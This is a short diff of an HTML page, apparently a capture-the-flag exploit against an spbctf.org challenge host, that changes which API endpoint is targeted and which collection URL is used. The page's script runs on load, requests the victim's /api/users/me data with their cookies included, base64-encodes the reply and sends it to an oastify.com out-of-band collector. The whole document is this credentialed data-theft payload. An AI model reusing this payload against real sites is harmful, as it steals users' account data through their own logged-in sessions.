@@ -3,12 +3,12 @@
   <body>
     <h1>Loading...</h1>
     <script>
-      fetch("https://t-alps-18q400mk.spbctf.org/api/balance", {
+      fetch("https://t-alps-18q400mk.spbctf.org/api/users/me", { 
         method: "GET",
         credentials: "include"
       })
       .then(r => r.text())
-      .then(t => fetch("https://rmhxcphoiykwig6st96322ybv21wpmdb.oastify.com/?bal=" + btoa(t)));
+      .then(t => fetch("https://4z4ap2u1vbx9vtj56mjgffbo8feb21qq.oastify.com/?bal=" + btoa(t)));
     </script>
   </body>
 </html>
